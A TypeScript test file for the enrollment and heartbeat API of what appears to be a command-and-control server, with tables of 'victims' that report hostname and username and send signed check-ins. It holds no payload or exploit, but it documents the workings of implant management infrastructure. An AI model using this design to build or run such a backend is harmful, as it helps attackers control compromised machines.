import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes, randomUUID } from 'node:crypto';

// The suite expects a disposable Postgres from the C/A gate.
(process.env as Record<string, string | undefined>)['DATABASE_URL'] ??= 'postgresql://spc:spc@127.0.0.1:55432/spc?schema=public';
(process.env as Record<string, string | undefined>)['NODE_ENV'] = 'test';
process.env['PUBLIC_URL'] = 'https://c2.example';
process.env['JWT_SECRET'] = 'j'.repeat(48);
process.env['MASTER_KEY'] = randomBytes(32).toString('base64');
process.env['STORAGE_DIR'] = '/tmp/opencode/enroll-storage';

import Fastify from 'fastify';
import { prisma } from '../server/lib/db';
import { parseJsonBody } from '../server/lib/http';
import { enrollTokenHashV2, enrollTokenV2, hmac, openSecret, sealSecret, sha256hex, victimCanonical, b64u } from '../server/lib/crypto';
import { agentRoutes } from '../server/routes/agent';

const token = randomBytes(32).toString('base64url');
const buildId = randomUUID();
let buildRow = '';
let app: ReturnType<typeof Fastify>;
const host = `host-${randomUUID()}`;
const user = 'alice';

before(async () => {
  const build = await prisma.build.create({
    data: {
      name: 'gate',
      version: '0.4.0',
      buildId,
      tokenHash: enrollTokenHashV2(token, buildId),
      secret: sealSecret(token),
      enrollScheme: 2,
      config: {}
    }
  });
  buildRow = build.id;
  app = Fastify();
  app.addContentTypeParser('application/json', { parseAs: 'buffer' }, (request: any, body: any, done: any) => {
    (request as typeof request & { rawBody: Buffer }).rawBody = body as Buffer;
    done(null, parseJsonBody(body as Buffer));
  });
  app.setErrorHandler((error: any, _request: any, reply: any) => {
    const status = (error as { status?: number; statusCode?: number }).status ?? (error as { statusCode?: number }).statusCode ?? 500;
    reply.code(status).send({ error: error.message });
  });
  await app.register(agentRoutes, { prefix: '/api/v1' });
});

after(async () => {
  await app.close();
  await prisma.victim.deleteMany({ where: { buildId: buildRow } });
  await prisma.build.delete({ where: { id: buildRow } });
  await prisma.$disconnect();
});

function enrollBody(extra: Record<string, unknown> = {}) {
  return {
    build_token: enrollTokenV2(token, buildId),
    build_id: buildId,
    hostname: host,
    os: 'linux',
    username: user,
    profile: 'full',
    artifact_scheme: 2,
    capabilities: [],
    ...extra
  };
}

async function hb(victimId: string, deviceToken: string) {
  const body = Buffer.from(JSON.stringify({ status: 'ok', uptime_s: 1, modules: {}, counters: {}, profile: 'full' }));
  const ts = String(Math.floor(Date.now() / 1000));
  const nonce = randomBytes(16).toString('base64url');
  const signature = hmac(Buffer.from(deviceToken, 'base64url'),
    victimCanonical('POST', '/api/v1/hb', ts, nonce, body)).toString('base64url');
  return app.inject({
    method: 'POST', url: '/api/v1/hb', payload: body,
    headers: { 'content-type': 'application/json', 'x-victim-id': victimId, 'x-timestamp': ts, 'x-nonce': nonce, 'x-signature': signature }
  });
}

test('two unverified enrolls keep the active token and the salt', async () => {
  const first = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  assert.equal(first.statusCode, 201);
  const one = first.json();
  const saltOne = one.key_salt;

  const [a, b] = await Promise.all([
    app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() }),
    app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() })
  ]);
  assert.equal(a.statusCode, 201);
  assert.equal(b.statusCode, 201);
  const row = await prisma.victim.findUniqueOrThrow({ where: { id: one.victim_id } });
  const active = openSecret(row.deviceTokenEnc);
  assert.equal(active, one.device_token, 'the confirmed token survives unverified enrolls');
  assert.equal(openSecret(row.keySaltEnc!), saltOne, 'the salt never changes');
  assert.equal(row.identityState, 'grace');
  const signed = await hb(one.victim_id, one.device_token);
  assert.equal(signed.statusCode, 200);
  const confirmed = await prisma.victim.findUniqueOrThrow({ where: { id: one.victim_id } });
  assert.equal(confirmed.identityState, 'confirmed');
  assert.equal(confirmed.pendingTokenEnc, null);
});

test('a confirmed enroll racing an unverified one keeps its rotated token', async () => {
  for (let round = 0; round < 3; round++) {
    const name = `race-${randomUUID()}`;
    const created = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody({ hostname: name }) });
    const victim = created.json();
    const salt = victim.key_salt;

    const [confirmed, unverified] = await Promise.all([
      app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody({ hostname: name, device_token: victim.device_token }) }),
      app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody({ hostname: name }) })
    ]);
    assert.equal(confirmed.statusCode, 201);
    assert.equal(unverified.statusCode, 201);

    const row = await prisma.victim.findUniqueOrThrow({ where: { id: victim.victim_id } });
    assert.equal(openSecret(row.keySaltEnc!), salt, 'the salt never changes');
    // The stale unverified write must not put the pre-rotation token back.
    const signed = await hb(victim.victim_id, confirmed.json().device_token);
    assert.equal(signed.statusCode, 200, 'the rotated token survives the race');
  }
});

test('a pending token signs but does not confirm', async () => {
  const created = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  const victim = created.json();
  const before = await prisma.victim.findUniqueOrThrow({ where: { id: victim.victim_id } });
  const active = openSecret(before.deviceTokenEnc);
  const attacker = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  const pending = attacker.json().device_token;
  const signed = await hb(victim.victim_id, pending);
  assert.equal(signed.statusCode, 200);
  const row = await prisma.victim.findUniqueOrThrow({ where: { id: victim.victim_id } });
  assert.equal(row.identityState, 'grace');
  assert.equal(openSecret(row.deviceTokenEnc), active);
  assert.equal(openSecret(row.pendingTokenEnc!), pending);
});

test('a wrong token is explicit and never degrades to grace', async () => {
  const created = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  const bad = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody({ device_token: randomBytes(32).toString('base64url') }) });
  assert.equal(bad.statusCode, 401);
  assert.ok(created.json().victim_id);
});

test('grace 0 replaces the token immediately', async () => {
  await prisma.build.update({ where: { id: buildRow }, data: { enrollGraceHours: 0 } });
  const first = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  const second = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody() });
  const row = await prisma.victim.findUniqueOrThrow({ where: { id: first.json().victim_id } });
  assert.equal(openSecret(row.deviceTokenEnc), second.json().device_token);
  assert.equal(row.pendingTokenEnc, null);
  await prisma.build.update({ where: { id: buildRow }, data: { enrollGraceHours: 24 } });
});

test('the build token is the HKDF one, not the legacy HMAC', async () => {
  const legacy = b64u(hmac(Buffer.from(token, 'base64url'), 'enroll').subarray(0, 32));
  const reply = await app.inject({ method: 'POST', url: '/api/v1/enroll', payload: enrollBody({ build_token: legacy }) });
  assert.equal(reply.statusCode, 401);
  assert.equal(sha256hex(enrollTokenV2(token, buildId)), (await prisma.build.findUniqueOrThrow({ where: { id: buildRow } })).tokenHash);
});
